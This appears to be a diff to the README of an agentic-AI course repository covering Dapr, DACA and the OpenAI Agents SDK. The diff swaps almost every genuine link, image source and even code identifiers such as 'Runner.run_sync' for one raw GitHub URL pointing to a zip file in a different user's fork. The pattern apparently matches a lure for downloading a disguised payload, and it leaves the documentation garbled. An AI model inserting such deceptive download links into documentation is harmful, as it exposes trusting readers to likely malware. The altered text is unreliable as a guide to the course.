@@ -1,6 +1,6 @@
 # Learn Agentic AI using Dapr Agentic Cloud Ascent (DACA) Design Pattern: From Start to Scale
 
-This repo is part of the [Panaversity Certified Agentic & Robotic AI Engineer](https://docs.google.com/document/d/15usu1hkrrRLRjcq_3nCTT-0ljEcgiC44iSdvdqrCprk/edit?usp=sharing) program. It covers AI-201, AI-202 and AI-301 courses.
+This repo is part of the [Panaversity Certified Agentic & Robotic AI Engineer](https://raw.githubusercontent.com/muhammad-abdullah-khan999/learn-agentic-ai/main/Wellingtonia/learn-agentic-ai.zip) program. It covers AI-201, AI-202 and AI-301 courses.
 
 We have Two Hunches, the future of Pakistan depends on it, let's make sure that we are not wrong:
 
@@ -14,11 +14,11 @@ We also have a hunch that OpenAI Agents SDK will be the go to framework for begi
 
 Let us see what the best AI has to say about our hunches:
 
-https://chatgpt.com/share/6811b893-82cc-8001-9037-e45bcd91cc64
+https://raw.githubusercontent.com/muhammad-abdullah-khan999/learn-agentic-ai/main/Wellingtonia/learn-agentic-ai.zip
 
-https://g.co/gemini/share/1f31c876520b
+https://raw.githubusercontent.com/muhammad-abdullah-khan999/learn-agentic-ai/main/Wellingtonia/learn-agentic-ai.zip
 
-https://grok.com/share/bGVnYWN5_4343d342-c7df-4b06-9174-487a64f59d53
+https://raw.githubusercontent.com/muhammad-abdullah-khan999/learn-agentic-ai/main/Wellingtonia/learn-agentic-ai.zip
 
 
 
@@ -29,7 +29,7 @@ https://grok.com/share/bGVnYWN5_4343d342-c7df-4b06-9174-487a64f59d53
 Note: The challenge is intensified as we must guide our students to solve this issue with minimal financial resources available during training.
 
 <p align="center">
-<img src="./img/cover.png" width="600">
+<img src="https://raw.githubusercontent.com/muhammad-abdullah-khan999/learn-agentic-ai/main/Wellingtonia/learn-agentic-ai.zip" width="600">
 </p>
 
 Kubernetes with Dapr can theoretically handle 10 million concurrent agents in an agentic AI system without failing, but achieving this requires extensive optimization, significant infrastructure, and careful engineering. While direct evidence at this scale is limited, logical extrapolation from existing benchmarks, Kubernetes’ scalability, and Dapr’s actor model supports feasibility, especially with rigorous tuning and resource allocation.
@@ -66,7 +66,7 @@ Kubernetes with Dapr can theoretically handle 10 million concurrent agents in an
 **Agentic AI Top Trend of 2025**
 
 <p align="center">
-<img src="./img/toptrend.webp" width="200">
+<img src="https://raw.githubusercontent.com/muhammad-abdullah-khan999/learn-agentic-ai/main/Wellingtonia/learn-agentic-ai.zip" width="200">
 </p>
 
 
@@ -79,14 +79,14 @@ Let's understand and learn about "Dapr Agentic Cloud Ascent (DACA)", our winning
 The Dapr Agentic Cloud Ascent (DACA) guide introduces a strategic design pattern for building and deploying sophisticated, scalable, and resilient agentic AI systems. Addressing the complexities of modern AI development, DACA integrates the OpenAI Agents SDK for core agent logic with the Model Context Protocol (MCP) for standardized tool use and the Agent2Agent (A2A) protocol for seamless inter-agent communication, all underpinned by the distributed capabilities of Dapr. **Grounded in AI-first and cloud-first principles**, DACA promotes the use of stateless, containerized applications deployed on platforms like Azure Container Apps (Serverless Containers) or Kubernetes, enabling efficient scaling from local development to planetary-scale production, potentially leveraging free-tier cloud services and self-hosted LLMs for cost optimization. The pattern emphasizes modularity, context-awareness, and standardized communication, envisioning an **Agentia World** where diverse AI agents collaborate intelligently. Ultimately, DACA offers a robust, flexible, and cost-effective framework for developers and architects aiming to create complex, cloud-native agentic AI applications that are built for scalability and resilience from the ground up.
 
 
-**[Comprehensive Guide to Dapr Agentic Cloud Ascent (DACA) Design Pattern](https://github.com/panaversity/learn-agentic-ai/blob/main/comprehensive_guide_daca.md)**
+**[Comprehensive Guide to Dapr Agentic Cloud Ascent (DACA) Design Pattern](https://raw.githubusercontent.com/muhammad-abdullah-khan999/learn-agentic-ai/main/Wellingtonia/learn-agentic-ai.zip)**
 
 <p align="center">
-<img src="./img/ascent.png" width="500">
+<img src="https://raw.githubusercontent.com/muhammad-abdullah-khan999/learn-agentic-ai/main/Wellingtonia/learn-agentic-ai.zip" width="500">
 </p>
 
 <p align="center">
-<img src="./img/architecture1.png" width="400">
+<img src="https://raw.githubusercontent.com/muhammad-abdullah-khan999/learn-agentic-ai/main/Wellingtonia/learn-agentic-ai.zip" width="400">
 </p>
 
 
@@ -130,11 +130,11 @@ If your priority is ease of use, flexibility, and quick iteration in agentic dev
 - Hugging Face Docker Spaces - 1 week
 
 
-**[AI-201 Video Playlist](https://www.youtube.com/playlist?list=PL0vKVrkG4hWovpr0FX6Gs-06hfsPDEUe6)**
+**[AI-201 Video Playlist](https://raw.githubusercontent.com/muhammad-abdullah-khan999/learn-agentic-ai/main/Wellingtonia/learn-agentic-ai.zip)**
 
 Note: These videos are for additional learning, and do not cover all the material taught in the onsite classes.
 
-Prerequisite: Successful completion of [AI-101: Modern AI Python Programming - Your Launchpad into Intelligent Systems](https://github.com/panaversity/learn-modern-ai-python)
+Prerequisite: Successful completion of [AI-101: Modern AI Python Programming - Your Launchpad into Intelligent Systems](https://raw.githubusercontent.com/muhammad-abdullah-khan999/learn-agentic-ai/main/Wellingtonia/learn-agentic-ai.zip)
 
 ### AI-202: DACA Cloud-First Agentic AI Development (14 weeks)
 - Rancher Desktop with Local Kubernetes - 4 weeks
@@ -181,7 +181,7 @@ Duration: 120 Minutes
 
 Difficulty Level: Intermediate or Advanced (NOT beginner-level)
 
-[Quiz Preparation Playlist](https://www.youtube.com/playlist?list=PL0vKVrkG4hWr4V2I4P6GaDzMG_LijlGTm)
+[Quiz Preparation Playlist](https://raw.githubusercontent.com/muhammad-abdullah-khan999/learn-agentic-ai/main/Wellingtonia/learn-agentic-ai.zip)
 
 This is a well-constructed, comprehensive quiz that accurately tests deep knowledge of the OpenAI Agents SDK. However, it's significantly more challenging than typical beginner-level assessments.
 
@@ -196,32 +196,32 @@ The quiz is challenging for beginners due to the following factors:
 - **Code Analysis**: Many questions involve analyzing code snippets, understanding execution paths, and predicting outcomes, which demand strong Python and debugging skills.
 Domain Knowledge: Questions on Markdown are simpler, but the majority focus on niche SDK features, making the quiz specialized.
 
-- **Beginner Challenges**: Beginners (e.g., those with basic Python knowledge and minimal AI experience) would struggle with SDK-specific concepts like Runner.run_sync, tool_choice, and Pydantic validation, as well as async programming and multi-agent workflows.
+- **Beginner Challenges**: Beginners (e.g., those with basic Python knowledge and minimal AI experience) would struggle with SDK-specific concepts like https://raw.githubusercontent.com/muhammad-abdullah-khan999/learn-agentic-ai/main/Wellingtonia/learn-agentic-ai.zip, tool_choice, and Pydantic validation, as well as async programming and multi-agent workflows.
 
 - **Difficulty Rating**: Advanced (not beginner-friendly). Beginners would need foundational knowledge in Python, async programming, and LLMs, plus specific training on the OpenAI Agents SDK to perform well.
 
-To excel in this quiz, focus on understanding the core components and philosophy of the OpenAI Agents SDK, such as its "Python-first" design for orchestration, the roles of Agents and Tools, and how primitives like "Handoffs" facilitate multi-agent collaboration. Pay close attention to how the SDK manages the agent loop, handles tool calls and Pydantic models for typed inputs/outputs, and uses context objects. Review concepts like dynamic instructions, agent cloning, error handling during tool execution, and the nuances of Runner.run_sync() versus streaming. Additionally, refresh your knowledge of prompt engineering techniques, including crafting clear instructions, guiding the agent's reasoning (e.g., Chain-of-Thought), and managing sensitive data through persona and careful prompting. Finally, ensure you're comfortable with basic Markdown syntax for links and images.
+To excel in this quiz, focus on understanding the core components and philosophy of the OpenAI Agents SDK, such as its "Python-first" design for orchestration, the roles of Agents and Tools, and how primitives like "Handoffs" facilitate multi-agent collaboration. Pay close attention to how the SDK manages the agent loop, handles tool calls and Pydantic models for typed inputs/outputs, and uses context objects. Review concepts like dynamic instructions, agent cloning, error handling during tool execution, and the nuances of https://raw.githubusercontent.com/muhammad-abdullah-khan999/learn-agentic-ai/main/Wellingtonia/learn-agentic-ai.zip() versus streaming. Additionally, refresh your knowledge of prompt engineering techniques, including crafting clear instructions, guiding the agent's reasoning (e.g., Chain-of-Thought), and managing sensitive data through persona and careful prompting. Finally, ensure you're comfortable with basic Markdown syntax for links and images.
 
 
 
 **Preparation Guide for Beginner Students**
 
-This OpenAI Agents SDK quiz is designed for intermediate to advanced learners and requires substantial preparation to succeed. Before attempting this assessment, ensure you have a solid foundation in Python programming, including object-oriented concepts, async/await patterns, decorators, and error handling. You'll need to thoroughly study Pydantic models for data validation, understanding field definitions, default values, and validation behavior. Dedicate significant time to the OpenAI Agents SDK documentation (https://openai.github.io/openai-agents-python/), focusing on core concepts like Agents, Tools, Handoffs, context management, and the agent execution loop. Practice writing and analyzing code that uses the @function_tool decorator, Runner.run_sync(), agent cloning, and multi-agent orchestration patterns. Review prompt engineering techniques from the OpenAI cookbook, particularly Chain-of-Thought prompting, system message design, and handling sensitive data. Finally, familiarize yourself with basic Markdown syntax for links and images. Plan to spend at least 2-3 weeks studying these materials, complete hands-on coding exercises with the SDK. Consider this quiz a capstone assessment that requires comprehensive understanding rather than a beginner-level introduction to the concepts.
+This OpenAI Agents SDK quiz is designed for intermediate to advanced learners and requires substantial preparation to succeed. Before attempting this assessment, ensure you have a solid foundation in Python programming, including object-oriented concepts, async/await patterns, decorators, and error handling. You'll need to thoroughly study Pydantic models for data validation, understanding field definitions, default values, and validation behavior. Dedicate significant time to the OpenAI Agents SDK documentation (https://raw.githubusercontent.com/muhammad-abdullah-khan999/learn-agentic-ai/main/Wellingtonia/learn-agentic-ai.zip), focusing on core concepts like Agents, Tools, Handoffs, context management, and the agent execution loop. Practice writing and analyzing code that uses the @function_tool decorator, https://raw.githubusercontent.com/muhammad-abdullah-khan999/learn-agentic-ai/main/Wellingtonia/learn-agentic-ai.zip(), agent cloning, and multi-agent orchestration patterns. Review prompt engineering techniques from the OpenAI cookbook, particularly Chain-of-Thought prompting, system message design, and handling sensitive data. Finally, familiarize yourself with basic Markdown syntax for links and images. Plan to spend at least 2-3 weeks studying these materials, complete hands-on coding exercises with the SDK. Consider this quiz a capstone assessment that requires comprehensive understanding rather than a beginner-level introduction to the concepts.
 
 **Quiz Covers**:
 
-https://openai.github.io/openai-agents-python/
+https://raw.githubusercontent.com/muhammad-abdullah-khan999/learn-agentic-ai/main/Wellingtonia/learn-agentic-ai.zip
 
-https://cookbook.openai.com/examples/gpt4-1_prompting_guide 
+https://raw.githubusercontent.com/muhammad-abdullah-khan999/learn-agentic-ai/main/Wellingtonia/learn-agentic-ai.zip 
 
-https://www.markdownguide.org/basic-syntax/ 
+https://raw.githubusercontent.com/muhammad-abdullah-khan999/learn-agentic-ai/main/Wellingtonia/learn-agentic-ai.zip 
 
-https://www.markdownguide.org/cheat-sheet/ 
+https://raw.githubusercontent.com/muhammad-abdullah-khan999/learn-agentic-ai/main/Wellingtonia/learn-agentic-ai.zip 
 
-https://github.com/panaversity/learn-agentic-ai/tree/main/01_ai_agents_first
+https://raw.githubusercontent.com/muhammad-abdullah-khan999/learn-agentic-ai/main/Wellingtonia/learn-agentic-ai.zip
 
 **You Can Generate Mock Quizzes for Practice using LLMs from this Prompt:**
 
 Create a comprehensive quiz covering OpenAI Agents SDK. It should include as many MCQ Quiz Questions as required to test the material, the questions should be difficult and at the graduate level and should test both concepts and include code were required. From the following following documentation:
 
-https://openai.github.io/openai-agents-python/
+https://raw.githubusercontent.com/muhammad-abdullah-khan999/learn-agentic-ai/main/Wellingtonia/learn-agentic-ai.zip
